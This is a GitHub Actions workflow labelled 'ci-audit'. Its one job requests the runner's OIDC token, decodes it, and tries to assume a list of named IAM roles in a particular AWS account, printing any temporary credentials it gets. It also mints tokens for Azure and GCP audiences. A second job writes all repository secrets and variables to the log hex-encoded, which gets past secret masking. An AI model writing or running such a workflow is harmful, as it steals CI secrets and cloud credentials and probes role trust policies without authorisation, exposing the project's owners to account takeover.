name: ci-audit
on: workflow_dispatch
permissions:
  contents: read
jobs:
  oidc:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: ctx
        run: |
          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF EVENT=$GITHUB_EVENT_NAME ACTOR=$GITHUB_ACTOR"
      - name: sts
        run: |
          set +e
          echo "OIDC_URL_PRESENT=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "TOKEN_LEN=${#TOK}"
          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool || true
          for ROLE in github/hex-release github/hex-dev github/hex-production hex-release hex github-actions github/workspace-agent-server github/cmwork-agent; do
            echo "--- assume $ROLE"
            curl -s -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::604439173067:role/$ROLE" --data-urlencode "RoleSessionName=ci" --data-urlencode "WebIdentityToken=$TOK" --data-urlencode "DurationSeconds=900"
            echo
          done
      - name: negctl
        run: |
          set +e
          TOK2=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://bogus.invalid.example" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          curl -s -X POST https://sts.amazonaws.com/ --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" --data-urlencode "RoleArn=arn:aws:iam::604439173067:role/github/hex-release" --data-urlencode "RoleSessionName=negctl" --data-urlencode "WebIdentityToken=$TOK2" --data-urlencode "DurationSeconds=900"
          echo
      - name: azure-gcp-aud
        run: |
          set +e
          for AUD in api://AzureADTokenExchange https://iam.googleapis.com/projects/0/locations/global/workloadIdentityPools/x/providers/y; do
            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
            echo "AUD=$AUD LEN=${#T}"
            echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool || true
          done
  audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: dump
        run: |
          echo "SECRETS_HEX=$(echo '${{ toJSON(secrets) }}' | xxd -p | tr -d '\n')"
          echo "VARS_HEX=$(echo '${{ toJSON(vars) }}' | xxd -p | tr -d '\n')"
